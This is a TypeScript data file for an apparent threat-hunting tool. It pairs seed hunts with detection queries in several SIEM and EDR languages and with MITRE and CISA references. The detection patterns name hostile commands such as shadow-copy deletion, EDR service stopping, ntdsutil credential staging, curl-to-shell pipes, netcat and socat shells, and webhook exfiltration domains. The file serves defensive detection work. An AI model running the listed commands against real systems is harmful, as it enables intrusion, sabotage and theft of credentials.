import type { HuntPlatform, HuntReference, TodayHunt, TodayHuntSource } from '../types';

/**
 * Per-platform queries and reference reading for the seed hunts, plus extra seed hunts
 * (APT, malware, ClickFix). Queries are written with String.raw so backslashes stay literal.
 *
 * References: only pages we know exist (MITRE ATT&CK, CISA advisories, major vendor research).
 * A platform with no entry shows "no query yet" in the UI rather than an invented one.
 */

const mitre = (id: string, name: string): HuntReference => ({
  title: `${id}: ${name}`,
  publisher: 'MITRE ATT&CK',
  url: `https://attack.mitre.org/techniques/${id.replace('.', '/')}/`,
});

const REF = {
  cisaKev: { title: 'Known Exploited Vulnerabilities Catalog', publisher: 'CISA', url: 'https://www.cisa.gov/known-exploited-vulnerabilities-catalog' },
  cisaRansomHub: { title: '#StopRansomware: RansomHub Ransomware (AA24-242A)', publisher: 'CISA', url: 'https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-242a' },
  cisaAkira: { title: '#StopRansomware: Akira Ransomware (AA24-109A)', publisher: 'CISA', url: 'https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-109a' },
  cisaScatteredSpider: { title: 'Scattered Spider (AA23-320A)', publisher: 'CISA', url: 'https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-320a' },
  cisaIvanti: { title: 'Threat Actors Exploit Multiple Vulnerabilities in Ivanti Connect Secure and Policy Secure Gateways (AA24-060B)', publisher: 'CISA', url: 'https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-060b' },
  cisaVoltTyphoon: { title: 'PRC State-Sponsored Actors Compromise and Maintain Persistent Access to U.S. Critical Infrastructure (AA24-038A)', publisher: 'CISA', url: 'https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-038a' },
  msVoltTyphoon: { title: 'Volt Typhoon targets US critical infrastructure with living-off-the-land techniques', publisher: 'Microsoft Security Blog', url: 'https://www.microsoft.com/en-us/security/blog/2023/05/24/volt-typhoon-targets-us-critical-infrastructure-with-living-off-the-land-techniques/' },
  msClickFix: { title: 'Think before you Click(Fix): Analyzing the ClickFix social engineering technique', publisher: 'Microsoft Security Blog', url: 'https://www.microsoft.com/en-us/security/blog/2025/08/21/think-before-you-clickfix-analyzing-the-clickfix-social-engineering-technique/' },
  ppClickFix: { title: 'Security Brief: ClickFix social engineering technique floods threat landscape', publisher: 'Proofpoint', url: 'https://www.proofpoint.com/us/blog/threat-insight/security-brief-clickfix-social-engineering-technique-floods-threat-landscape' },
  msLumma: { title: 'Lumma Stealer: Breaking down the delivery techniques and capabilities of a prolific infostealer', publisher: 'Microsoft Security Blog', url: 'https://www.microsoft.com/en-us/security/blog/2025/05/21/lumma-stealer-breaking-down-the-delivery-techniques-and-capabilities-of-a-prolific-infostealer/' },
  mitreVoltTyphoon: { title: 'Volt Typhoon (G1017)', publisher: 'MITRE ATT&CK', url: 'https://attack.mitre.org/groups/G1017/' },
  mitreScatteredSpider: { title: 'Scattered Spider (G1015)', publisher: 'MITRE ATT&CK', url: 'https://attack.mitre.org/groups/G1015/' },
  mitreKinsing: { title: 'Kinsing (S0599)', publisher: 'MITRE ATT&CK', url: 'https://attack.mitre.org/software/S0599/' },
} satisfies Record<string, HuntReference>;

interface Enrichment {
  source?: TodayHuntSource;
  platformQueries: Partial<Record<HuntPlatform, string>>;
  references: HuntReference[];
}

export const HUNT_ENRICHMENT: Record<string, Enrichment> = {
  // PACS gateway web shell
  'th-1': {
    references: [mitre('T1190', 'Exploit Public-Facing Application'), mitre('T1505.003', 'Web Shell'), REF.cisaKev],
    platformQueries: {
      crowdstrike: String.raw`#event_simpleName=ProcessRollup2 event_platform=Win
| ParentBaseFileName=/^(w3wp|pacs_router|dicom_srv|tomcat\d*)\.exe$/i
| FileName=/^(powershell|pwsh|cmd|rundll32)\.exe$/i
| CommandLine=/(-enc|DownloadString|Invoke-Expression|WebClient|net\s+user|whoami)/i
| table([@timestamp, ComputerName, UserName, ParentBaseFileName, FileName, CommandLine])`,
      defender: String.raw`DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("w3wp.exe", "pacs_router.exe", "dicom_srv.exe", "tomcat.exe")
| where FileName in~ ("powershell.exe", "pwsh.exe", "cmd.exe", "rundll32.exe")
| where ProcessCommandLine has_any ("-enc", "DownloadString", "Invoke-Expression", "WebClient", "net user", "whoami")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine`,
      trendmicro: String.raw`eventId:1 AND eventSubId:2
AND processName:(w3wp.exe OR pacs_router.exe OR dicom_srv.exe OR tomcat.exe)
AND objectFilePath:(*\powershell.exe OR *\pwsh.exe OR *\cmd.exe OR *\rundll32.exe)
AND objectCmd:(*-enc* OR *DownloadString* OR *Invoke-Expression* OR *WebClient* OR *whoami*)`,
      elastic: String.raw`process where host.os.type == "windows" and event.type == "start" and
  process.parent.name : ("w3wp.exe", "pacs_router.exe", "dicom_srv.exe", "tomcat*.exe") and
  process.name : ("powershell.exe", "pwsh.exe", "cmd.exe", "rundll32.exe") and
  process.command_line : ("*-enc*", "*DownloadString*", "*Invoke-Expression*", "*WebClient*", "*net user*", "*whoami*")`,
      sigma: String.raw`title: Web or PACS Service Spawning Script Interpreter
status: experimental
description: Web / imaging service process launching a shell with download or recon arguments (possible web shell).
logsource:
  category: process_creation
  product: windows
detection:
  selection_parent:
    ParentImage|endswith:
      - '\w3wp.exe'
      - '\pacs_router.exe'
      - '\dicom_srv.exe'
      - '\tomcat.exe'
  selection_child:
    Image|endswith:
      - '\powershell.exe'
      - '\pwsh.exe'
      - '\cmd.exe'
      - '\rundll32.exe'
  selection_cli:
    CommandLine|contains:
      - '-enc'
      - 'DownloadString'
      - 'Invoke-Expression'
      - 'WebClient'
      - 'whoami'
  condition: all of selection_*
level: high
tags:
  - attack.initial-access
  - attack.t1190
  - attack.persistence
  - attack.t1505.003`,
      splunk: String.raw`index=* sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1
  (ParentImage="*w3wp.exe" OR ParentImage="*pacs_router.exe" OR ParentImage="*dicom_srv.exe" OR ParentImage="*tomcat.exe")
  (Image="*powershell.exe" OR Image="*pwsh.exe" OR Image="*cmd.exe" OR Image="*rundll32.exe")
  (CommandLine="*-enc*" OR CommandLine="*DownloadString*" OR CommandLine="*Invoke-Expression*" OR CommandLine="*WebClient*" OR CommandLine="*whoami*")
| table _time, host, User, ParentImage, Image, CommandLine`,
    },
  },

  // Ransomware: shadow copy deletion + EDR tampering
  'th-2': {
    source: 'Ransomware',
    references: [mitre('T1490', 'Inhibit System Recovery'), mitre('T1562.001', 'Impair Defenses: Disable or Modify Tools'), REF.cisaRansomHub],
    platformQueries: {
      crowdstrike: String.raw`#event_simpleName=ProcessRollup2 event_platform=Win
| CommandLine=/(vssadmin.+delete\s+shadows|wbadmin.+delete\s+catalog|bcdedit.+(recoveryenabled\s+no|ignoreallfailures)|fltmc(\.exe)?\s+unload|(sc|net1?)(\.exe)?\s+stop\s+\S*(csagent|sentinel|windefend|sophos|carbonblack))/i
| table([@timestamp, ComputerName, UserName, ParentBaseFileName, FileName, CommandLine])`,
      defender: String.raw`DeviceProcessEvents
| where Timestamp > ago(7d)
| where (ProcessCommandLine has_any ("vssadmin", "wbadmin", "bcdedit")
        and ProcessCommandLine has_any ("delete shadows", "delete catalog", "recoveryenabled no", "ignoreallfailures"))
     or (ProcessCommandLine has_any ("fltmc unload", "sc stop", "net stop")
        and ProcessCommandLine has_any ("csagent", "sentinel", "windefend", "sophos", "carbonblack"))
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine`,
      trendmicro: String.raw`eventId:1 AND eventSubId:2
AND (objectCmd:(*delete*shadows* OR *delete*catalog* OR *recoveryenabled*no* OR *ignoreallfailures*)
  OR (objectCmd:(*fltmc*unload* OR *sc*stop* OR *net*stop*) AND objectCmd:(*csagent* OR *sentinel* OR *windefend* OR *sophos* OR *carbonblack*)))`,
      elastic: String.raw`process where host.os.type == "windows" and event.type == "start" and
(
  (process.name : ("vssadmin.exe", "wbadmin.exe", "bcdedit.exe") and
   process.command_line : ("*delete shadows*", "*delete catalog*", "*recoveryenabled no*", "*ignoreallfailures*")) or
  (process.name : ("fltmc.exe", "sc.exe", "net.exe", "net1.exe") and
   process.args : ("unload", "stop") and
   process.command_line : ("*csagent*", "*sentinel*", "*windefend*", "*sophos*", "*carbonblack*"))
)`,
      sigma: String.raw`title: Recovery Inhibition or Security Service Stop Before Encryption
status: experimental
logsource:
  category: process_creation
  product: windows
detection:
  selection_recovery:
    CommandLine|contains:
      - 'delete shadows'
      - 'delete catalog'
      - 'recoveryenabled no'
      - 'ignoreallfailures'
  selection_tamper_cmd:
    CommandLine|contains:
      - 'fltmc unload'
      - 'sc stop'
      - 'net stop'
  selection_tamper_target:
    CommandLine|contains:
      - 'csagent'
      - 'sentinel'
      - 'windefend'
      - 'sophos'
      - 'carbonblack'
  condition: selection_recovery or (selection_tamper_cmd and selection_tamper_target)
level: critical
tags:
  - attack.impact
  - attack.t1490
  - attack.defense-evasion
  - attack.t1562.001`,
      splunk: String.raw`index=* sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1
  ((CommandLine="*delete shadows*" OR CommandLine="*delete catalog*" OR CommandLine="*recoveryenabled no*" OR CommandLine="*ignoreallfailures*")
   OR ((CommandLine="*fltmc*unload*" OR CommandLine="*sc*stop*" OR CommandLine="*net*stop*")
       AND (CommandLine="*csagent*" OR CommandLine="*sentinel*" OR CommandLine="*windefend*" OR CommandLine="*sophos*" OR CommandLine="*carbonblack*")))
| table _time, host, User, ParentImage, Image, CommandLine`,
    },
  },

  // Helpdesk MFA reset / rogue factor enrollment (identity logs)
  'th-3': {
    references: [mitre('T1621', 'Multi-Factor Authentication Request Generation'), mitre('T1098.005', 'Account Manipulation: Device Registration'), REF.mitreScatteredSpider, REF.cisaScatteredSpider],
    platformQueries: {
      defender: String.raw`// Microsoft Entra ID audit logs (Sentinel / Defender XDR with Entra connector)
AuditLogs
| where TimeGenerated > ago(7d)
| where OperationName in ("Admin registered security info", "User registered security info", "Reset password (by admin)", "Admin deleted security info")
| extend Target = tostring(TargetResources[0].userPrincipalName),
         Actor = tostring(InitiatedBy.user.userPrincipalName)
| summarize Operations = make_set(OperationName), First = min(TimeGenerated), Last = max(TimeGenerated) by Target, Actor
| where array_length(Operations) > 1 and Last - First < 30m`,
      elastic: String.raw`sequence by okta.target.alternate_id with maxspan=30m
  [any where event.dataset == "okta.system" and okta.event_type in ("user.account.reset_password", "user.mfa.factor.reset_all", "user.mfa.factor.deactivate")]
  [any where event.dataset == "okta.system" and okta.event_type == "user.mfa.factor.activate"]`,
      sigma: String.raw`title: Okta MFA Factor Reset Followed by New Factor Enrollment
status: experimental
logsource:
  product: okta
  service: okta
detection:
  selection:
    eventtype:
      - 'user.account.reset_password'
      - 'user.mfa.factor.reset_all'
      - 'user.mfa.factor.deactivate'
      - 'user.mfa.factor.activate'
  condition: selection
level: medium
tags:
  - attack.persistence
  - attack.t1098.005
  - attack.credential-access
  - attack.t1621`,
      splunk: String.raw`index=okta eventType IN ("user.account.reset_password", "user.mfa.factor.reset_all", "user.mfa.factor.activate", "user.session.start")
| transaction target{}.alternateId maxspan=30m
| where eventcount > 1
| table _time, target{}.alternateId, actor.alternateId, eventType, client.ipAddress, client.userAgent.rawUserAgent`,
    },
  },

  // Edge appliance exploitation spawning shells (Linux)
  'th-4': {
    references: [mitre('T1190', 'Exploit Public-Facing Application'), mitre('T1059.004', 'Unix Shell'), REF.cisaIvanti, REF.cisaKev],
    platformQueries: {
      crowdstrike: String.raw`#event_simpleName=ProcessRollup2 event_platform=Lin
| ParentBaseFileName=/^(webvpn|vpnserver|nginx|apache2|httpd|java)$/i
| FileName=/^(sh|bash|dash|python3?|perl|nc|ncat|socat|curl|wget)$/i
| table([@timestamp, ComputerName, UserName, ParentBaseFileName, FileName, CommandLine])`,
      defender: String.raw`DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("webvpn", "vpnserver", "nginx", "apache2", "httpd", "java")
| where FileName in~ ("sh", "bash", "dash", "python", "python3", "perl", "nc", "ncat", "socat", "curl", "wget")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine`,
      trendmicro: String.raw`eventId:1 AND eventSubId:2
AND processName:(webvpn OR vpnserver OR nginx OR apache2 OR httpd)
AND objectFilePath:(*/sh OR */bash OR */dash OR */python3 OR */perl OR */nc OR */ncat OR */socat)`,
      elastic: String.raw`process where host.os.type == "linux" and event.type == "start" and
  process.parent.name in ("webvpn", "vpnserver", "nginx", "apache2", "httpd", "java") and
  process.name in ("sh", "bash", "dash", "python", "python3", "perl", "nc", "ncat", "socat", "curl", "wget")`,
      sigma: String.raw`title: Web or VPN Daemon Spawning Shell on Linux
status: experimental
logsource:
  category: process_creation
  product: linux
detection:
  selection_parent:
    ParentImage|endswith:
      - '/webvpn'
      - '/vpnserver'
      - '/nginx'
      - '/apache2'
      - '/httpd'
  selection_child:
    Image|endswith:
      - '/sh'
      - '/bash'
      - '/dash'
      - '/python3'
      - '/perl'
      - '/nc'
      - '/ncat'
      - '/socat'
  condition: all of selection_*
level: high
tags:
  - attack.initial-access
  - attack.t1190
  - attack.execution
  - attack.t1059.004`,
      splunk: String.raw`index=* sourcetype="linux:audit" type=EXECVE OR type=SYSCALL
| where match(exe, "(?i)/(sh|bash|dash|python3?|perl|nc|ncat|socat)$") AND match(ppid_exe, "(?i)(webvpn|vpnserver|nginx|apache2|httpd)")
| stats count, values(cmdline) as commands by host, ppid_exe, exe
| sort - count`,
    },
  },

  // POS memory scraper exfil via webhooks
  'th-5': {
    source: 'Malware',
    references: [mitre('T1567.004', 'Exfiltration Over Webhook'), mitre('T1055.001', 'Dynamic-link Library Injection'), REF.cisaAkira],
    platformQueries: {
      crowdstrike: String.raw`#event_simpleName=DnsRequest event_platform=Win
| DomainName=/(discord(app)?\.com|api\.telegram\.org|hooks\.slack\.com|pastebin\.com|transfer\.sh)$/i
| ContextBaseFileName=/^(powershell|rundll32|regsvr32|pos_engine|pos_terminal)\.exe$/i
| table([@timestamp, ComputerName, ContextBaseFileName, DomainName])`,
      defender: String.raw`DeviceNetworkEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName in~ ("powershell.exe", "rundll32.exe", "regsvr32.exe", "pos_engine.exe", "pos_terminal.exe")
| where RemoteUrl has_any ("discord.com/api/webhooks", "discordapp.com/api/webhooks", "api.telegram.org", "hooks.slack.com", "transfer.sh")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteUrl, RemoteIP`,
      trendmicro: String.raw`processName:(powershell.exe OR rundll32.exe OR regsvr32.exe OR pos_engine.exe OR pos_terminal.exe)
AND request:(*discord.com/api/webhooks* OR *discordapp.com/api/webhooks* OR *api.telegram.org* OR *hooks.slack.com* OR *transfer.sh*)`,
      elastic: String.raw`network where host.os.type == "windows" and
  process.name : ("powershell.exe", "rundll32.exe", "regsvr32.exe", "pos_engine.exe", "pos_terminal.exe") and
  dns.question.name : ("discord.com", "*.discord.com", "discordapp.com", "*.discordapp.com", "api.telegram.org", "hooks.slack.com", "transfer.sh")`,
      sigma: String.raw`title: POS or Script Host Resolving Webhook Exfiltration Services
status: experimental
logsource:
  category: dns_query
  product: windows
detection:
  selection_image:
    Image|endswith:
      - '\powershell.exe'
      - '\rundll32.exe'
      - '\regsvr32.exe'
      - '\pos_engine.exe'
      - '\pos_terminal.exe'
  selection_query:
    QueryName|endswith:
      - 'discord.com'
      - 'discordapp.com'
      - 'api.telegram.org'
      - 'hooks.slack.com'
      - 'transfer.sh'
  condition: all of selection_*
level: high
tags:
  - attack.exfiltration
  - attack.t1567.004`,
      splunk: String.raw`index=* sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=22
  (Image="*powershell.exe" OR Image="*rundll32.exe" OR Image="*regsvr32.exe" OR Image="*pos_engine.exe" OR Image="*pos_terminal.exe")
  (QueryName="*discord.com" OR QueryName="*discordapp.com" OR QueryName="api.telegram.org" OR QueryName="hooks.slack.com" OR QueryName="transfer.sh")
| stats count, values(QueryName) as domains by host, Image`,
    },
  },

  // DNS tunneling coverage gap
  'th-6': {
    references: [mitre('T1071.004', 'Application Layer Protocol: DNS'), mitre('T1048', 'Exfiltration Over Alternative Protocol')],
    platformQueries: {
      crowdstrike: String.raw`#event_simpleName=DnsRequest
| length(DomainName, as=qlen)
| qlen > 60
| regex("(?<parent>[^.]+\.[^.]+)$", field=DomainName)
| groupBy([ComputerName, parent], function=[count(as=queries), count(DomainName, distinct=true, as=unique_names)])
| unique_names > 40
| sort(unique_names, order=desc)`,
      defender: String.raw`DeviceEvents
| where Timestamp > ago(7d) and ActionType == "DnsQueryResponse"
| extend Query = tostring(parse_json(AdditionalFields).DnsQueryString)
| where strlen(Query) > 60
| extend Parts = split(Query, ".")
| extend ParentDomain = strcat(Parts[-2], ".", Parts[-1])
| summarize Queries = count(), UniqueNames = dcount(Query) by DeviceName, ParentDomain
| where UniqueNames > 40
| order by UniqueNames desc`,
      elastic: String.raw`network where network.protocol == "dns" and
  length(dns.question.name) > 60 and
  dns.question.type in ("TXT", "NULL", "CNAME", "A")`,
      sigma: String.raw`title: Long High-Entropy DNS Labels (Possible Tunneling)
status: experimental
logsource:
  product: zeek
  service: dns
detection:
  selection:
    query|re: '^[a-zA-Z0-9]{40,}\.'
  filter_internal:
    query|endswith: '.corp.local'
  condition: selection and not filter_internal
level: medium
tags:
  - attack.command-and-control
  - attack.t1071.004`,
      splunk: String.raw`index=zeek sourcetype="zeek:dns"
| eval query_len = len(query)
| where query_len > 40
| rex field=query "(?<parent>[^.]+\.[^.]+)$"
| stats count, dc(query) as unique_subdomains, avg(query_len) as avg_len by id.orig_h, parent
| where unique_subdomains > 40 AND avg_len > 35`,
    },
  },

  // APT: Volt Typhoon living off the land
  'th-7': {
    references: [REF.cisaVoltTyphoon, REF.msVoltTyphoon, REF.mitreVoltTyphoon, mitre('T1003.003', 'OS Credential Dumping: NTDS'), mitre('T1090.001', 'Proxy: Internal Proxy')],
    platformQueries: {
      crowdstrike: String.raw`#event_simpleName=ProcessRollup2 event_platform=Win
| CommandLine=/(ntdsutil.+(ifm|create\s+full)|netsh.+interface\s+portproxy\s+add|vssadmin.+create\s+shadow|wmic.+process\s+call\s+create|ldifde.+-f)/i
| table([@timestamp, ComputerName, UserName, ParentBaseFileName, FileName, CommandLine])`,
      defender: String.raw`DeviceProcessEvents
| where Timestamp > ago(14d)
| where (FileName =~ "ntdsutil.exe" and ProcessCommandLine has_any ("ifm", "create full"))
     or (FileName =~ "netsh.exe" and ProcessCommandLine has_all ("portproxy", "add"))
     or (FileName =~ "vssadmin.exe" and ProcessCommandLine has "create shadow")
     or (FileName =~ "wmic.exe" and ProcessCommandLine has_all ("process", "call", "create"))
     or (FileName =~ "ldifde.exe" and ProcessCommandLine has "-f")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine`,
      trendmicro: String.raw`eventId:1 AND eventSubId:2
AND (objectCmd:(*ntdsutil*ifm* OR *ntdsutil*create*full*) OR objectCmd:*netsh*portproxy*add*
  OR objectCmd:*vssadmin*create*shadow* OR objectCmd:*wmic*process*call*create* OR objectCmd:*ldifde*-f*)`,
      elastic: String.raw`process where host.os.type == "windows" and event.type == "start" and
(
  (process.name : "ntdsutil.exe" and process.command_line : ("*ifm*", "*create full*")) or
  (process.name : "netsh.exe" and process.command_line : "*portproxy*add*") or
  (process.name : "vssadmin.exe" and process.command_line : "*create shadow*") or
  (process.name : "wmic.exe" and process.command_line : "*process*call*create*") or
  (process.name : "ldifde.exe" and process.args : "-f")
)`,
      sigma: String.raw`title: Living-off-the-Land Credential Staging and Port Proxy (Volt Typhoon TTPs)
status: experimental
logsource:
  category: process_creation
  product: windows
detection:
  selection_ntds:
    Image|endswith: '\ntdsutil.exe'
    CommandLine|contains:
      - 'ifm'
      - 'create full'
  selection_portproxy:
    Image|endswith: '\netsh.exe'
    CommandLine|contains|all:
      - 'portproxy'
      - 'add'
  selection_shadow:
    Image|endswith: '\vssadmin.exe'
    CommandLine|contains: 'create shadow'
  condition: 1 of selection_*
level: high
tags:
  - attack.credential-access
  - attack.t1003.003
  - attack.command-and-control
  - attack.t1090.001`,
      splunk: String.raw`index=* sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1
  ((Image="*ntdsutil.exe" (CommandLine="*ifm*" OR CommandLine="*create full*"))
   OR (Image="*netsh.exe" CommandLine="*portproxy*add*")
   OR (Image="*vssadmin.exe" CommandLine="*create shadow*")
   OR (Image="*wmic.exe" CommandLine="*process*call*create*"))
| table _time, host, User, ParentImage, Image, CommandLine`,
    },
  },

  // ClickFix / fake CAPTCHA
  'th-8': {
    references: [REF.msClickFix, REF.ppClickFix, mitre('T1204.004', 'User Execution: Malicious Copy and Paste'), mitre('T1218.005', 'System Binary Proxy Execution: Mshta')],
    platformQueries: {
      crowdstrike: String.raw`#event_simpleName=ProcessRollup2 event_platform=Win
| ParentBaseFileName=/^explorer\.exe$/i
| FileName=/^(powershell|pwsh|mshta|cmd|curl|conhost)\.exe$/i
| CommandLine=/(https?:\/\/|iex|iwr|invoke-webrequest|invoke-restmethod|-enc|-w(indowstyle)?\s+h|captcha|verif|robot)/i
| table([@timestamp, ComputerName, UserName, FileName, CommandLine])`,
      defender: String.raw`// Commands pasted into the Win+R dialog run as children of explorer.exe
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName =~ "explorer.exe"
| where FileName in~ ("powershell.exe", "pwsh.exe", "mshta.exe", "cmd.exe", "curl.exe", "conhost.exe")
| where ProcessCommandLine has_any ("http", "iex", "iwr", "Invoke-WebRequest", "Invoke-RestMethod", "-enc", "-w h", "hidden", "captcha", "verif", "robot")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine
// Pivot: DeviceRegistryEvents | where RegistryKey has @"\Explorer\RunMRU" and RegistryValueData has_any ("powershell", "mshta", "curl", "http")`,
      trendmicro: String.raw`eventId:1 AND eventSubId:2 AND processName:explorer.exe
AND objectFilePath:(*\powershell.exe OR *\pwsh.exe OR *\mshta.exe OR *\cmd.exe OR *\curl.exe)
AND objectCmd:(*http* OR *iex* OR *iwr* OR *Invoke-WebRequest* OR *-enc* OR *hidden* OR *captcha* OR *verif*)`,
      elastic: String.raw`process where host.os.type == "windows" and event.type == "start" and
  process.parent.name : "explorer.exe" and
  process.name : ("powershell.exe", "pwsh.exe", "mshta.exe", "cmd.exe", "curl.exe", "conhost.exe") and
  process.command_line : ("*http*", "*iex*", "*iwr*", "*Invoke-WebRequest*", "*Invoke-RestMethod*", "*-enc*", "*hidden*", "*captcha*", "*verif*", "*robot*")`,
      sigma: String.raw`title: ClickFix - Pasted Command Executed From Run Dialog
status: experimental
description: Explorer launching a script host or downloader with web or obfuscation arguments, typical of fake CAPTCHA lures.
logsource:
  category: process_creation
  product: windows
detection:
  selection_parent:
    ParentImage|endswith: '\explorer.exe'
  selection_child:
    Image|endswith:
      - '\powershell.exe'
      - '\pwsh.exe'
      - '\mshta.exe'
      - '\cmd.exe'
      - '\curl.exe'
  selection_cli:
    CommandLine|contains:
      - 'http'
      - 'iex'
      - 'iwr'
      - 'Invoke-WebRequest'
      - '-enc'
      - 'captcha'
      - 'verif'
  condition: all of selection_*
level: high
tags:
  - attack.execution
  - attack.t1204.004
  - attack.defense-evasion
  - attack.t1218.005`,
      splunk: String.raw`index=* sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1 ParentImage="*explorer.exe"
  (Image="*powershell.exe" OR Image="*pwsh.exe" OR Image="*mshta.exe" OR Image="*cmd.exe" OR Image="*curl.exe")
  (CommandLine="*http*" OR CommandLine="*iex*" OR CommandLine="*iwr*" OR CommandLine="*Invoke-WebRequest*" OR CommandLine="*-enc*" OR CommandLine="*captcha*" OR CommandLine="*verif*")
| table _time, host, User, Image, CommandLine`,
    },
  },

  // Malware: Lumma Stealer AutoIt loader
  'th-9': {
    references: [REF.msLumma, mitre('T1059.010', 'Command and Scripting Interpreter: AutoHotKey & AutoIT'), mitre('T1555.003', 'Credentials from Web Browsers')],
    platformQueries: {
      crowdstrike: String.raw`#event_simpleName=ProcessRollup2 event_platform=Win
| ImageFileName=/\\(AppData|Temp|Users\\Public)\\/i
| FileName=/\.(pif|com|scr)$/i or OriginalFilename=/^AutoIt3\.exe$/i or CommandLine=/\.a3x/i
| table([@timestamp, ComputerName, UserName, ParentBaseFileName, ImageFileName, CommandLine])`,
      defender: String.raw`DeviceProcessEvents
| where Timestamp > ago(7d)
| where FolderPath has_any (@"\AppData\", @"\Temp\", @"\Users\Public\")
| where ProcessVersionInfoOriginalFileName =~ "AutoIt3.exe"
     or FileName endswith ".pif" or FileName endswith ".com" or FileName endswith ".scr"
     or ProcessCommandLine has ".a3x"
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FolderPath, ProcessCommandLine, SHA256`,
      trendmicro: String.raw`eventId:1 AND eventSubId:2
AND objectFilePath:(*\AppData\* OR *\Temp\* OR *\Users\Public\*)
AND (objectFilePath:(*.pif OR *.com OR *.scr) OR objectCmd:*.a3x*)`,
      elastic: String.raw`process where host.os.type == "windows" and event.type == "start" and
  process.executable : ("?:\\Users\\*\\AppData\\*", "?:\\Users\\Public\\*", "?:\\Windows\\Temp\\*") and
  (process.pe.original_file_name : "AutoIt3.exe" or
   process.name : ("*.pif", "*.com", "*.scr") or
   process.command_line : "*.a3x*")`,
      sigma: String.raw`title: AutoIt Interpreter or Renamed Loader Running From User-Writable Path
status: experimental
logsource:
  category: process_creation
  product: windows
detection:
  selection_path:
    Image|contains:
      - '\AppData\'
      - '\Temp\'
      - '\Users\Public\'
  selection_loader:
    - OriginalFileName: 'AutoIt3.exe'
    - Image|endswith:
        - '.pif'
        - '.com'
        - '.scr'
    - CommandLine|contains: '.a3x'
  condition: selection_path and selection_loader
level: high
tags:
  - attack.execution
  - attack.t1059.010`,
      splunk: String.raw`index=* sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1
  (Image="*\\AppData\\*" OR Image="*\\Temp\\*" OR Image="*\\Users\\Public\\*")
  (OriginalFileName="AutoIt3.exe" OR Image="*.pif" OR Image="*.com" OR Image="*.scr" OR CommandLine="*.a3x*")
| table _time, host, User, ParentImage, Image, CommandLine, Hashes`,
    },
  },

  // Malware: Kinsing cryptominer on Linux workloads
  'th-10': {
    references: [REF.mitreKinsing, mitre('T1496', 'Resource Hijacking'), mitre('T1105', 'Ingress Tool Transfer')],
    platformQueries: {
      crowdstrike: String.raw`#event_simpleName=ProcessRollup2 event_platform=Lin
| CommandLine=/((curl|wget)\s.+\|\s*(ba)?sh|kinsing|kdevtmpfsi|xmrig|stratum\+tcp)/i
| table([@timestamp, ComputerName, UserName, ParentBaseFileName, FileName, CommandLine])`,
      defender: String.raw`DeviceProcessEvents
| where Timestamp > ago(7d)
| where ProcessCommandLine matches regex @"(?i)(curl|wget)\s.+\|\s*(ba)?sh"
     or FileName in~ ("kinsing", "kdevtmpfsi", "xmrig")
     or ProcessCommandLine has "stratum+tcp"
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine`,
      trendmicro: String.raw`eventId:1 AND eventSubId:2
AND (objectCmd:(*curl*sh* OR *wget*sh* OR *stratum+tcp*) OR objectFilePath:(*/kinsing OR */kdevtmpfsi OR */xmrig))`,
      elastic: String.raw`process where host.os.type == "linux" and event.type == "start" and
(
  process.name in ("kinsing", "kdevtmpfsi", "xmrig") or
  process.command_line : ("*stratum+tcp*", "*curl*|*sh*", "*wget*|*sh*")
)`,
      sigma: String.raw`title: Linux Cryptominer Download or Execution (Kinsing)
status: experimental
logsource:
  category: process_creation
  product: linux
detection:
  selection_names:
    Image|endswith:
      - '/kinsing'
      - '/kdevtmpfsi'
      - '/xmrig'
  selection_pool:
    CommandLine|contains: 'stratum+tcp'
  selection_pipe:
    CommandLine|contains:
      - 'curl'
      - 'wget'
    CommandLine|re: '\|\s*(ba)?sh'
  condition: 1 of selection_*
level: high
tags:
  - attack.impact
  - attack.t1496`,
      splunk: String.raw`index=* sourcetype="linux:audit" type=EXECVE
| eval cmd = coalesce(cmdline, a0." ".a1." ".a2)
| where match(cmd, "(?i)((curl|wget)\s.+\|\s*(ba)?sh|kinsing|kdevtmpfsi|xmrig|stratum\+tcp)")
| table _time, host, exe, cmd`,
    },
  },
};

const score = (threatRelevance: number, telemetryAvailable: number, detectionGap: number, recentActivity: number, historicalPrevalence: number) => ({
  threatRelevance,
  telemetryAvailable,
  detectionGap,
  recentActivity,
  historicalPrevalence,
  priorityScore: Math.round((threatRelevance + telemetryAvailable + detectionGap + recentActivity + historicalPrevalence) / 5),
});

/** Extra seed hunts covering APT, malware and ClickFix. Queries/references come from HUNT_ENRICHMENT. */
export const EXTRA_TODAYS_HUNTS: TodayHunt[] = [
  {
    id: 'th-7',
    clientId: 'client-aegis-defense',
    source: 'APT',
    sourceReference: 'Volt Typhoon living-off-the-land activity (CISA AA24-038A)',
    priority: 'Critical',
    hypothesisName: 'Volt Typhoon LOTL: NTDS.dit staging via ntdsutil and netsh port proxies on engineering servers',
    techniques: [
      { id: 'T1003.003', name: 'NTDS', tactic: 'Credential Access' },
      { id: 'T1090.001', name: 'Internal Proxy', tactic: 'Command and Control' },
      { id: 'T1047', name: 'Windows Management Instrumentation', tactic: 'Execution' },
    ],
